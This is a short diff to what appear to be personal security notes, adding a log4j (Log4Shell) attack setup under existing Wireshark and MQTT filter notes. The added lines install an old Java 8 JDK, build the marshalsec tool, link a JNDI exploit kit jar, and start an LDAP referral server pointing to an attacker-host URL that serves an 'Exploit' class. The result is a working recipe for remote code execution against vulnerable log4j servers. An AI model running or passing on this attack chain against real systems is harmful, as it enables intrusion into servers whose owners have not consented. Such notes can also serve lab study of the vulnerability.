@@ -54,3 +54,25 @@ file info for detect it esay
 wireshark
 ip.src!={ip} && ip.dest=={ip}
 IOT->mqtt->Publish Message -> MQ Telemetry Protocol, Publish Message
+
+log4j
+https://planetone.online/downloads/java/jdk/
+java install 
+sudo mkdir /usr/lib/jvm
+cd /usr/lib/jvm
+sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz
+sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
+sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
+sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
+sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
+sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
+sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
+java -version
+
+git clone https://github.com/mbechler/marshalsec.git 
+cd marshalsec
+ sudo apt install maven
+https://github.com/pimps/JNDI-Exploit-Kit/raw/master/target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
+mvn clean package -DskipTests
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
+
